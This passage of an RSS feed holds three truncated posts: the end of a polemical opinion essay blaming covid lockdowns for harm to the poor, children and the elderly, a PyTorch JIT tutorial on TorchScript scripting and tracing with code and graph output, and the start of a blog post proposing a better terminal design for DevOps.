noopener">Alzheimerâ€™s</a>. It is <a href="https://www.webmd.com/balance/news/20180504/loneliness-rivals-obesity-smoking-as-health-risk" target="_blank" rel="noreferrer noopener">as deadly</a> as obesity or smoking 15 cigarettes a day.</p>



<p>Financial insecurity will exacerbate these health risks for the elderly. Economic shutdown has <a href="https://www.ft.com/content/d1fce3e7-428b-4b8a-ab6a-119a38fa1e7d" target="_blank" rel="noreferrer noopener">weakened</a> global pension funds and they may not recover. Millions of Baby Boomers have been forced into <a href="https://www.forbes.com/sites/jackkelly/2020/11/19/nearly-30-million-baby-boomers-forced-into-unwanted-retirement/?sh=4fb8019d5d7d" target="_blank" rel="noreferrer noopener">early retirement</a> without adequate savings. Many Americans are <a href="https://www.cnbc.com/2020/09/14/americans-are-forced-to-raid-retirement-savings-during-the-pandemic.html" target="_blank" rel="noreferrer noopener">dipping into their retirement funds early</a>. The Congressional Budget Office projects that $2.8 trillion in Social Security funds will be <a href="https://thehill.com/policy/finance/528268-covid-19-damage-to-social-security-to-extend-beyond-pandemic" target="_blank" rel="noreferrer noopener">used up in a decade</a> due to the impact of un- and underemployment on lowering contributions.</p>



<div id="block_5fda90f836c10">
    <p>
		â€œIncome is the main determinant of covid mortality.â€    </p>
</div>


<p>Outcomes of lockdown are equally grim for children. Even if K-12 schools reopen in January 2021, the average student will have lost <a href="https://www.washingtonpost.com/education/students-falling-behind/2020/12/06/88d7157a-3665-11eb-8d38-6aea1adb3839_story.html" target="_blank" rel="noreferrer noopener">7 months of instruction</a>. Because literacy and education levels are a main <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2713445/" target="_blank" rel="noreferrer noopener">predictor of longevity</a>, these learning losses represent years of life stolen from students. Moreover, cases of severe abuse and mental-health related ER visits <a href="https://apnews.com/article/anxiety-mental-health-boston-coronavirus-pandemic-massachusetts-004adb5ee0ef17ff4b5e2e294e36ff3d" target="_blank" rel="noreferrer noopener">are surging for children</a>. They will also experience <a href="https://www.nytimes.com/2020/11/25/opinion/sunday/covid-quarantine-children-immune-systems.html" target="_blank" rel="noreferrer noopener">weakened immune systems</a> due to lack of exposure to seasonal viruses and natural pathogens.</p>



<p>For people with chronic health conditions or those in need of urgent medical treatment, the short- and long-term consequences of lockdown are disastrous. In the United States, cancer screenings fell by <a href="https://www.radiologybusiness.com/topics/healthcare-economics/cancer-screenings-epic-ehr-covid-19-coronavirus" target="_blank" rel="noreferrer noopener">86-94%</a> in the spring. Many hospitals <a href="https://www.beckershospitalreview.com/finance/47-hospitals-closed-filed-for-bankruptcy-this-year.html" target="_blank" rel="noreferrer noopener">had to close</a> due to lack of revenue from routine surgeries and procedures. Hospitals are expected to lose a total of <a href="https://www.aha.org/news/headline/2020-06-30-aha-report-hospital-financial-losses-covid-19-expected-top-323-billion#:~:text=An%20AHA%20report%20released%20today,least%20%24323%20billion%20in%202020." target="_blank" rel="noreferrer noopener">$323 billion</a> this year. <a href="https://www.npr.org/2020/05/10/853524764/amid-pandemic-hospitals-lay-off-1-4m-workers-in-april" target="_blank" rel="noreferrer noopener">1.4 million hospital staff</a> were laid off in April while private health insurance companies <a href="https://www.nytimes.com/2020/08/05/health/covid-insurance-profits.html" target="_blank" rel="noreferrer noopener">doubled their earnings</a>.&nbsp;</p>



<p>In the absence of meaningful investments in healthcare infrastructure, the covid mitigation strategies being pushed by federal, state, and local governments are neither credible nor effective. Elected officials routinely amplify raw case numbers in order to stoke fear and blame individuals for viral spread. As a result, we are currently â€œsaving livesâ€ by killing people. This is not an unforced error or a good policy idea implemented poorly. It is an economic agenda disguised as a health protocol.</p>



<h5>The New Caste System&nbsp;</h5>



<p>California Governor Gavin Newsom sends his children to <a href="https://www.politico.com/states/california/story/2020/10/30/newsom-sends-his-children-back-to-school-classrooms-in-california-1332811" target="_blank" rel="noreferrer noopener">in-person private school</a> while mandating virtual education for California public schools. He announced a <a href="https://www.theguardian.com/world/2020/dec/06/california-covid-lockdown-us-new-cases-hospitalisations-deaths-stay-at-home-order" target="_blank" rel="noreferrer noopener">second statewide lockdown</a> just a few weeks after attending an indoor, unmasked <a href="https://www.politico.com/news/2020/11/18/newsom-lobbyist-dinner-party-437892" target="_blank" rel="noreferrer noopener">dinner with lobbyists</a> at a Michelin three star restaurant where meals can cost up to <a href="https://sf.eater.com/2020/9/3/21421335/french-laundry-yountville-thomas-keller-indoor-dining-rich-people" target="_blank" rel="noreferrer noopener">$850 per person</a>. Newsom is just one of many <a href="https://www.nytimes.com/2020/11/23/nyregion/cuomo-thanksgiving-mother.html" target="_blank" rel="noreferrer noopener">politicians</a>, elites, and <a href="https://www.wsj.com/articles/mask-mischief-11595625179" target="_blank" rel="noreferrer noopener">bureaucrats</a> who break the rules. A static social order is being solidified. In our new caste system the wealthy have political and social <a href="https://www.bloomberg.com/news/articles/2020-12-03/u-k-to-exempt-high-value-business-travelers-from-quarantine" target="_blank" rel="noreferrer noopener">privileges</a> because they are considered clean and disease-free, while the more low-income someone is, the more they are treated as contaminated.&nbsp;</p>



<p>The goal of lockdown enthusiasts in the â€œwork from homeâ€ caste is to shift risk away from themselves and onto essential workers and the poor. <a href="https://www.bbc.com/worklife/article/20201023-coronavirus-how-will-the-pandemic-change-the-way-we-work" target="_blank" rel="noreferrer noopener">Only 40%</a> of the workforce can afford to stay home. <a href="https://www.commonwealthfund.org/publications/issue-briefs/2020/aug/looming-crisis-health-coverage-2020-biennial#:~:text=In%20the%20first%20half%20of%202020%2C%2043.4%20percent%20of%20U.S.,uninsured%20rate%20was%2012.5%20percent." target="_blank" rel="noreferrer noopener">43% of US adults</a> do not have adequate health insurance, and only 31% of low-paid workers have <a href="https://www.pewresearch.org/fact-tank/2020/03/12/as-coronavirus-spreads-which-u-s-workers-have-paid-sick-leave-and-which-dont/" target="_blank" rel="noreferrer noopener">paid sick leave</a> compared to 92% of high-paid workers. â€œStay homeâ€ is the self-congratulatory mantra of professionals who believe that their virtuous behavior prevents them from contracting covid. In fact, income is the <a href="https://prospect.org/coronavirus/covid-19-class-war-death-rates-income/" target="_blank" rel="noreferrer noopener">main determinant</a> of covid mortality.</p>



<p>Lockdown fanatics have helped manufacture consent for a brutal reorganization of labor that will plunge millions of people into serfdom. The work-from-home lifestyle is only possible through the labor of logistics workers who transport, sort, and deliver goods. Currently about <a href="https://www.nytimes.com/live/2020/12/04/business/us-economy-coronavirus" target="_blank" rel="noreferrer noopener">10 million jobs</a> that existed in February have not been replaced. Many workers have been forced to take on part-time, no-contract work, a labor model that is <a href="https://qz.com/1556194/the-gig-economy-is-quietly-undermining-a-century-of-worker-protections/" target="_blank" rel="noreferrer noopener">rolling back</a> decades of hard-fought protections.&nbsp;&nbsp;</p>



<p>Under the Obama/Biden administration, 94% of new jobs created were gig work, and in 2017 <a href="https://www.ilo.org/washington/WCMS_642303/lang--en/index.htm#:~:text=The%20Bureau%20of%20Labor%20Statistics,to%2043%20percent%20in%202020." target="_blank" rel="noreferrer noopener">34% of the workforce</a> was employed through the gig economy. Shutdowns are accelerating this trend, with food delivery apps <a href="https://www.nytimes.com/2020/11/30/nyregion/bike-delivery-workers-covid-pandemic.html" target="_blank" rel="noreferrer noopener">growing their profits</a> as workers struggle to get by. Subscription platforms like OnlyFans saw a <a href="https://www.sfchronicle.com/bayarea/article/Coronavirus-took-their-jobs-away-OnlyFans-let-15175650.php" target="_blank" rel="noreferrer noopener">surge in accounts</a> at the beginning of lockdown. In March the company saw a <a href="https://www.nytimes.com/2020/04/10/style/camsoda-onlyfans-streaming-sex-coronavirus.html" target="_blank" rel="noreferrer noopener">75% increase in users and 60,000 new creators</a>. Lockdown has made OnlyFans a <a href="https://www.bloomberg.com/news/articles/2020-12-05/celebrities-like-cardi-b-could-turn-onlyfans-into-a-billion-dollar-media-company" target="_blank" rel="noreferrer noopener">billion dollar business</a>, but the majority of creators make less than <a href="https://www.xsrus.com/writing/explain/onlyfans/" target="_blank" rel="noreferrer noopener">$145 a month</a>.&nbsp;</p>






<p>Internationally, workplace closures and supply chain disruptions will result in the loss of <a href="http://ilo.org/global/about-the-ilo/newsroom/news/WCMS_743036/lang--en/index.html" target="_blank" rel="noreferrer noopener">305 million</a> jobs. <a href="https://www.ilo.org/global/topics/employment-promotion/informal-economy/publications/WCMS_743534/lang--en/index.htm" target="_blank" rel="noreferrer noopener">1.6 billion</a> informal economy workers are at risk of losing their livelihoods. This devastation will be compounded by famine and the increased <a href="https://www.nytimes.com/2020/08/03/health/coronavirus-tuberculosis-aids-malaria.html" target="_blank" rel="noreferrer noopener">spread of untreated diseases</a> like <a href="https://www.sciencedaily.com/releases/2020/06/200624103257.htm" target="_blank" rel="noreferrer noopener">tuberculosis</a>. In July closed food markets were linked to <a href="https://apnews.com/article/lifestyle-ap-top-news-understanding-the-outbreak-hunger-international-news-5cbee9693c52728a3808f4e7b4965cbd" target="_blank" rel="noreferrer noopener">10,000 child deaths a month</a>. <a href="https://www.nytimes.com/2020/04/11/business/coronavirus-destroying-food.html" target="_blank" rel="noreferrer noopener">Food is being discarded</a> and crops are rotting in the fields while the number of people facing acute hunger this year has doubled to <a href="https://www.nytimes.com/2020/04/22/world/africa/coronavirus-hunger-crisis.html">265 </a><a href="https://www.nytimes.com/2020/04/22/world/africa/coronavirus-hunger-crisis.html" target="_blank" rel="noreferrer noopener">million</a>.&nbsp;</p>



<p>At the start of the covid crisis, vocal segments of the American left argued that economic shutdown was a way to resist <a href="https://jacobinmag.com/2020/03/donald-trump-wall-street-coronavirus-profits" target="_blank" rel="noreferrer noopener">billionaires</a> and <a href="https://www.dsausa.org/democratic-left/we-need-a-global-democratic-socialist-response-to-covid-19/" target="_blank" rel="noreferrer noopener">capitalism</a>. This demonstrated a deep misunderstanding of the way <a href="https://www.investopedia.com/financial-edge/0411/5-investors-that-are-both-rich-and-smart.aspx" target="_blank" rel="noreferrer noopener">financiers can profit</a> from economic contraction. Many on the left chose to ignore the Biblical scale of the destruction that economic stoppages would cause, arguing that the covid crisis was an <a href="https://jacobinmag.com/2020/03/quarantine-coronavirus-economy-left-organizing" target="_blank" rel="noreferrer noopener">opportunity</a>. Today the left continues to advance the illusion that <a href="https://jacobinmag.com/2020/11/joe-biden-coronavirus-pandemic-relief" target="_blank" rel="noreferrer noopener">meaningful relief</a> is possible, while workersâ€™ pensions are plundered, childrenâ€™s futures disappear, and <a href="https://www.cnn.com/2020/10/07/economy/global-poverty-rate-coronavirus/index.html" target="_blank" rel="noreferrer noopener">150 â€¦</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebellows.org/the-great-covid-class-war/">https://www.thebellows.org/the-great-covid-class-war/</a></em></p>]]>
            </description>
            <link>https://www.thebellows.org/the-great-covid-class-war/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508370</guid>
            <pubDate>Tue, 22 Dec 2020 16:58:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing models using the PyTorch JIT]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508269">thread link</a>) | @t-vi
<br/>
December 22, 2020 | https://lernapparat.de/jit-optimization-intro/ | <a href="https://web.archive.org/web/*/https://lernapparat.de/jit-optimization-intro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div id="submain">
  <article>

  
  
  <p>Dec. 21, 2020</p>
  
  <section>
   <p><img src="https://lernapparat.de/static/artikel/jit-optimization-intro/title.svg"> <span><label for="fn::fusor">âŠ•</label><span><span><a href="https://commons.wikimedia.org/wiki/File:US3386883_-_fusor.png">fusor</a></span></span></span></p>
<p>Today we look at TorchScript, the language implemented by the PyTorch JIT ("Just in Time compiler"), PyTorch's solution for deployment and model optimization. 
We can use it to export models to work beyond Python, e.g. on mobile or embedded platforms, or just to escape the infamous Python Global Interpreter Lock during computation. This is possibly the more well-known application.<span><label for="fn:thank_you"></label><span><span>Luca Antiga and Christian Sarofeen shared many insightful comments and suggestions after the article first went live. Thak you! All errors are still mine.</span></span></span></p>
<p>But the JIT also lends itself to the implementation <em>holistic</em> optimizations that consider several operations at once. This is  as opposed to just writing a better implementation of any given PyTorch operation, although the JIT works for these, too, as we will see.</p>
<p>We will start with a high-level overview of how PyTorch and the JIT work to then dive into the how it enables compiling fused kernels to optimize models at run time.<span><label for="fn:chapter15"></label><span><span>If you want to take a look at exporting models, do check out Chapter 15 of our <a href="https://www.manning.com/books/deep-learning-with-pytorch">book</a>, from which I also took some diagrams below. There we introduce the JIT with a view towards running the model in C++ and on mobile. The book also as a comprehensive introduction from everything PyTorch to how to represent data and a detailed account of project to build an AI detecting cancerous lung nodules.</span></span></span></p>
<p>This tutorial has been prepared in the context of work I did for AMD. Thank you!</p>
<h2>The overall structure of PyTorch</h2>
<p>The first thing we want to do when considering how the JIT works is consider the structure of PyTorch.</p>
<p><img src="https://lernapparat.de/static/artikel/jit-optimization-intro/Ch15_F4_PyTorch_calling_pytorch.svg">
(image from Deep Learning with PyTorch)</p>
<p>PyTorch most prominently is a Python library, I call this part classic PyTorch. Some parts are implemented in Python (e.g. the <code>torch.nn</code> modules and the optimizers), but the compute functions (like <code>torch.matmul</code>) are provided as a Python C++ extension.</p>
<p>Looking a bit closer, this Python C++ extension is a thin wrapper around PyTorch's C++ library <em>LibTorch</em>. That in turn uses the ATen tensor library which itself dispatches into various backends.</p>
<p>The PyTorch JIT now implements a virtual machine that takes in TorchScript programs (typically created through the <code>torch.jit</code> ) and runs them by calling into LibTorch itself, circumventing the Python parts.</p>
<p>The JIT also is extendable by defining <em>Custom Ops</em>, we'll get back to this. To run PyTorch-exported programs in Torch Mobile or Torch Serving, the typical thing is to implement a wrapper around the JIT api to load and run modules.</p>
<h2>TorchScript</h2>
<p>Now that we know that we want to run our model in the JIT execution, we should see how to get our model into TorchScript<span><label for="fn:torchscript"></label><span><span>TorchScript is used simultaneously for the language - mostly a typed subset of Python - and the representation (intermediate - IR).</span></span></span>, the form the JIT can process.</p>
<p>There are two main ways of achieving this (but they can be mixed), <em>scripting</em> and <em>tracing</em>. Let's look at them.</p>
<h3>Scripting</h3>
<p>Scripting compiles (mostly) a subset of Python.
It takes the Python source code and transforms it. 
"Here is what the function should do", just like normal programming.<span><label for="fn:notebook"></label><span><span>To run the code, check out the <a href="https://nbviewer.jupyter.org/github/lernapparat/tutorials/blob/main/jit/pytorch-jit-fuser-intro.ipynb">Notebook of this tutorial</a>.</span></span></span></p>
<div><pre><span></span><span>@torch.jit.script</span>
<span>def</span> <span>fn</span><span>(</span><span>x</span><span>):</span>
    <span>return</span> <span>x</span> <span>*</span> <span>2</span>
</pre></div>



<div><pre><span></span>(&lt;torch.jit.ScriptFunction at 0x7fcd5709a310&gt;,
 graph(%x.1 : Tensor):
   %2 : int = prim::Constant[value=2]() # &lt;ipython-input-3-6dcc6c3c1c8e&gt;:3:15
   %3 : Tensor = aten::mul(%x.1, %2) # &lt;ipython-input-3-6dcc6c3c1c8e&gt;:3:11
   return (%3))
</pre></div>

<h3>Tracing</h3>
<p>Tracing runs the code and observers the calls into PyTorch with some sample input.
"Watch me, now you know how to do the same."<span><label for="fn:evaluation_vs_print"></label><span><span>The avid reader will note that I sometimes leave the evaluation last (and have the result displayed by Jupyter if we are in a notebook) and sometimes use <code>print</code>. The main difference is how strings like <code>.code</code> below are handled: Jupyter will use "the representation" as output, showing multiline strings with newline characters as `\n, while printing actually starts a new line when seeing newline characters.</span></span></span></p>
<div><pre><span></span><span>def</span> <span>fn</span><span>(</span><span>x</span><span>):</span>
    <span>return</span> <span>x</span> <span>*</span> <span>2</span>
<span>fn</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>trace</span><span>(</span><span>fn</span><span>,</span> <span>[</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>5</span><span>)])</span>

<span>print</span><span>(</span><span>fn</span><span>.</span><span>graph</span><span>,</span> <span>fn</span><span>.</span><span>code</span><span>)</span>
</pre></div>

<div><pre><span></span>graph(%x : Float(5, strides=[1], requires_grad=0, device=cpu)):
  %1 : Long(requires_grad=0, device=cpu) = prim::Constant[value={2}]() # &lt;ipython-input-5-7d43d0af2e80&gt;:2:0
  %2 : Float(5, strides=[1], requires_grad=0, device=cpu) = aten::mul(%x, %1) # &lt;ipython-input-5-7d43d0af2e80&gt;:2:0
  return (%2)
 def fn(x: Tensor) -&gt; Tensor:
  return torch.mul(x, CONSTANTS.c0)
</pre></div>

<p>By the way: The specialization for the Tensor shape isn't relevant here and will be erased e.g. during saving of the model.</p>
<h3>What is TorchScript?</h3>
<p>Now that had a glimpse of TorchScript, what is it?</p>
<p>One important difference between TorchScript and Python is that in TorchScript everything is typed. Important
types are</p>
<ul>
<li><code>bool</code>, <code>int</code>, <code>long</code>, <code>double</code> for numbers (int = 32 bit integer, long = 64 bit integer)</li>
<li><code>Tensor</code> for tensors (of arbitrary shape, dtype, ...)</li>
<li><code>List[T]</code> a list with elements fo type T (one of the above)</li>
<li>Tuples are of fixed size with arbitrary but fixed element type, so e.g. <code>Tuple(Tensor, int)</code>.</li>
<li><code>Optional[T]</code> for things that can be <code>None</code></li>
</ul>
<p><code>None</code> always is of type <code>Optional[T]</code> for some specific <code>T</code> (except in the rarest circumstances).</p>
<p>PyTorch will mostly infer the intermediate and return types, but you need to annotate any non-Tensor inputs.</p>
<p>Another important difference is the binding behaviour - when a given variable name is looked up to find the associated variable. Python uses late binding. If we write a function that calls <code>torch.matmul</code> the Python interpreter will look up what <code>torch.matmul</code> is when it executes the statement in which it is used.</p>
<p>This is in contrast to many other languages, which use early binding, as - you guessed it - TorchScript does: When we compile a function to TorchScript, the JIT looks it up then<span><label for="fn:operator_dynamics"></label><span><span>While functions are looked up at compile time, the PyTorch JIT virtual machine executing the byte code looks up the <em>operators</em> during runtime.</span></span></span> and there and puts it into our function (it even inlines the commands, but that is not the point here).</p>
<h3>Tracing vs. Scripting</h3>
<p>Scripting will process all of the code, but it may not understand all of it. This means it captures all constructs it supports (e.g. some control flow), but it will fail if there is something it doesn't understand.</p>
<p>Tracing cannot see anything that is not a direct call into PyTorch and will happily ignore it (e.g. control flow)
This is also the reason why it will loudly complain if you have non-tensor inputs.</p>
<div><pre><span></span><span>def</span> <span>fn</span><span>(</span><span>x</span><span>):</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>x</span><span>.</span><span>dim</span><span>()):</span>
        <span>x</span> <span>=</span> <span>x</span> <span>*</span> <span>x</span>
    <span>return</span> <span>x</span>

<span>script_fn</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>script</span><span>(</span><span>fn</span><span>)</span>
<span>trace_fn</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>trace</span><span>(</span><span>fn</span><span>,</span> <span>[</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>5</span><span>,</span> <span>5</span><span>)])</span>
</pre></div>



<div><pre><span></span>def fn(x: Tensor) -&gt; Tensor:
  x0 = x
  for i in range(torch.dim(x)):
    x0 = torch.mul(x0, x0)
  return x0
</pre></div>



<div><pre><span></span>def fn(x: Tensor) -&gt; Tensor:
  x0 = torch.mul(x, x)
  return torch.mul(x0, x0)
</pre></div>

<h2>Tracing and Scripting Modules</h2>
<p>But our models often are not functions. What now?</p>
<p>With tracing, we can work with Modules just like we work with functions. We get a <code>ScriptModule</code> subclass that behaves much like a <code>Module</code> with parameters, state dict etc.</p>
<div><pre><span></span><span>model</span> <span>=</span> <span>torch</span><span>.</span><span>nn</span><span>.</span><span>Sequential</span><span>(</span>
    <span>torch</span><span>.</span><span>nn</span><span>.</span><span>Linear</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>),</span>
    <span>torch</span><span>.</span><span>nn</span><span>.</span><span>ReLU</span><span>(),</span>
    <span>torch</span><span>.</span><span>nn</span><span>.</span><span>Linear</span><span>(</span><span>10</span><span>,</span> <span>1</span><span>))</span>

<span>traced_model</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>trace</span><span>(</span><span>model</span><span>,</span> <span>[</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>8</span><span>,</span> <span>1</span><span>)])</span>
<span>type</span><span>(</span><span>traced_model</span><span>),</span> <span>traced_model</span>
</pre></div>

<div><pre><span></span>(torch.jit._trace.TopLevelTracedModule,
 Sequential(
   original_name=Sequential
   (0): Linear(original_name=Linear)
   (1): ReLU(original_name=ReLU)
   (2): Linear(original_name=Linear)
 ))
</pre></div>

<p>Saving is a bit different, here we include the model on purpose:</p>
<div><pre><span></span><span>traced_model</span><span>.</span><span>save</span><span>(</span><span>'./traced_model.pt'</span><span>)</span>
<span>loaded_model</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>load</span><span>(</span><span>'./traced_model.pt'</span><span>)</span>

<span>loaded_model</span><span>(</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>8</span><span>,</span><span>1</span><span>))</span>
</pre></div>

<div><pre><span></span>tensor([[ 0.2657],
        [ 0.1038],
        [ 0.1530],
        [ 0.3578],
        [ 0.0223],
        [ 0.0336],
        [-0.0023],
        [ 0.1440]], grad_fn=&lt;AddBackward0&gt;)
</pre></div>

<h2>Scripting Modules</h2>
<p>Scripting modules is ... a bit more tricky. The class in its entirety is not scripted, instead we need to script an instance of the module<span><label for="fn:no_init"></label><span><span>In particular we do not want to script the <code>__init__</code> method, but instead inspect the instance after it has been initialized.</span></span></span> . Then all data members will be collected and methods will be processed in a way similar to how script functions work.</p>
<div><pre><span></span><span>scripted_model</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>script</span><span>(</span><span>model</span><span>)</span>
<span>print</span><span>(</span><span>scripted_model</span><span>.</span><span>code</span><span>)</span>
</pre></div>

<div><pre><span></span>def forward(self,
    input: Tensor) -&gt; Tensor:
  _0 = getattr(self, "0")
  _1 = getattr(self, "1")
  _2 = getattr(self, "2")
  input0 = (_0).forward(input, )
  input1 = (_1).forward(input0, )
  return (_2).forward(input1, )
</pre></div>

<p>We can also look at the graph including submodules, but it gets unwieldy rather fast:</p>
<div><pre><span></span><span>scripted_model</span><span>.</span><span>forward</span><span>.</span><span>inlined_graph</span>
</pre></div>

<div><pre><span></span><span>graph</span><span>(</span><span>%self</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>container</span><span>.</span><span>___torch_mangle_13</span><span>.</span><span>Sequential</span><span>,</span>
      <span>%input</span><span>.1</span> <span>:</span> <span>Tensor</span><span>)</span><span>:</span>
  <span>%</span><span>2</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>linear</span><span>.</span><span>___torch_mangle_10</span><span>.</span><span>Linear</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"0"</span><span>](</span><span>%self</span><span>)</span>
  <span>%</span><span>3</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>activation</span><span>.</span><span>___torch_mangle_11</span><span>.</span><span>ReLU</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"1"</span><span>](</span><span>%self</span><span>)</span>
  <span>%</span><span>4</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>linear</span><span>.</span><span>___torch_mangle_12</span><span>.</span><span>Linear</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"2"</span><span>](</span><span>%self</span><span>)</span>
  <span>%</span><span>8</span> <span>:</span> <span>int</span> <span>=</span> <span>prim</span><span>::</span><span>Constant</span><span>[</span><span>value</span><span>=</span><span>1</span><span>]()</span>
  <span>%</span><span>9</span> <span>:</span> <span>int</span> <span>=</span> <span>prim</span><span>::</span><span>Constant</span><span>[</span><span>value</span><span>=</span><span>2</span><span>]()</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>22</span>
  <span>%</span><span>10</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"weight"</span><span>](</span><span>%</span><span>2</span><span>)</span>
  <span>%</span><span>11</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"bias"</span><span>](</span><span>%</span><span>2</span><span>)</span>
  <span>%</span><span>12</span> <span>:</span> <span>int</span> <span>=</span> <span>aten</span><span>::</span><span>dim</span><span>(</span><span>%input</span><span>.1</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>7</span>
  <span>%</span><span>13</span> <span>:</span> <span>bool</span> <span>=</span> <span>aten</span><span>::</span><span>eq</span><span>(</span><span>%</span><span>12</span><span>,</span> <span>%</span><span>9</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>7</span>
  <span>%input</span><span>.3</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>prim</span><span>::</span><span>If</span><span>(</span><span>%</span><span>13</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>4</span>
    <span>block0</span><span>()</span><span>:</span>
      <span>%</span><span>15</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>aten</span><span>::</span><span>t</span><span>(</span><span>%</span><span>10</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1665</span><span>:</span><span>39</span>
      <span>%ret</span><span>.2</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>aten</span><span>::</span><span>addmm</span><span>(</span><span>%</span><span>11</span><span>,</span> <span>%input</span><span>.1</span><span>,</span> <span>%</span><span>15</span><span>,</span> <span>%</span><span>8</span><span>,</span> <span>%</span><span>8</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1665</span><span>:</span><span>14</span>
      <span>-&gt;</span> <span>(</span><span>%ret</span><span>.2</span><span>)</span>
    <span>block1</span><span>()</span><span>:</span>
      <span>%</span><span>17</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>aten</span><span>::</span><span>t</span><span>(</span><span>%</span><span>10</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span>â€¦</pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lernapparat.de/jit-optimization-intro/">https://lernapparat.de/jit-optimization-intro/</a></em></p>]]>
            </description>
            <link>https://lernapparat.de/jit-optimization-intro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508269</guid>
            <pubDate>Tue, 22 Dec 2020 16:51:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing a Better Terminal]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25508230">thread link</a>) | @markessien
<br/>
December 22, 2020 | https://markessien.com/posts/terminal-concept/ | <a href="https://web.archive.org/web/*/https://markessien.com/posts/terminal-concept/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img src="https://markessien.com/img/posts/superterm.jpg" alt="SuperTerm"></p><p>Click <a href="https://markessien.com/img/posts/superterm.jpg">here</a> to view the bigger version.</p><p>Iâ€™ve been doing a lot of DevOps work recently, and terminals are horridly broken. There is so much copy and paste going on (well, unless you have a super memory). Why canâ€™t we fix that?</p><p>I have designed an improved terminal for people who deal with a lot of different servers, and need to do a bunch of different things.</p><p>On the left side, you can add all the servers you usually ssh into. You see their name and IP address prominently displayed. The green screen shows if you are currently logged in or not. When a task you were executing has stopped, a tiny cursor starts blinking.</p><p><img src="https://markessien.com/img/posts/superterm1.jpg" alt="SuperTerm"></p><p>I admit it, I still search the web anytime I need to setup MySQL. I still search the web for almost any DevOps task. And you end up with inconsistent blog posts riddled with ads. What if all that could move straight to the terminal - you search, and you get a guide. You can then click on the commands and they instantly copy into your terminal cursor.</p><p><img 